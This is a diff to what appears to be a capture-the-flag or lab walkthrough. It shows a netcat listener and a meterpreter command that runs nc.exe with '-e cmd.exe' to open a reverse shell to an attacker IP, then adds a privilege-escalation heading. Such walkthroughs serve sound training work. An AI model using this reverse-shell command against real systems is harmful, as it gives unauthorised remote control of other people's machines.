@@ -77,7 +77,11 @@ Step 3: Netcat
       ![image](https://user-images.githubusercontent.com/29686845/134699318-166baca3-2660-4a5d-b9df-98403840bff9.png)
     - We have our .exe file uploaded, so lets set up a listner and execute it:
     - run our listener `nc -lvnp 1234` in another terminal on your kali machine
-    - run `execute -f nc.exe -a "-e cmd.exe 10.10.14.14 1234"` in our meterpreter session. (Keep in mind that is your        tun0 ip and set listening port)
+    - run `execute -f nc.exe -a "-e cmd.exe 10.10.14.14 1234"` in our meterpreter session. (Keep in mind that is your         tun0 ip and set listening port)
       ![image](https://user-images.githubusercontent.com/29686845/134704321-d793013a-501c-4785-94de-df6ff2c87601.png)
       ![image](https://user-images.githubusercontent.com/29686845/134704375-c84761db-08a2-462c-b7db-2d0b73595884.png)
-    -   
+    - We have successful set up our more stable reverse shell.
+
+# Privilege Escalation
+
+Here is a [cheatsheet](http://www.cs.columbia.edu/~sedwards/classes/2015/1102-fall/Command%20Prompt%20Cheatsheet.pdf) for linux to windows commands. We are going to need it moving forward since we have a shell into a windwos machcine.
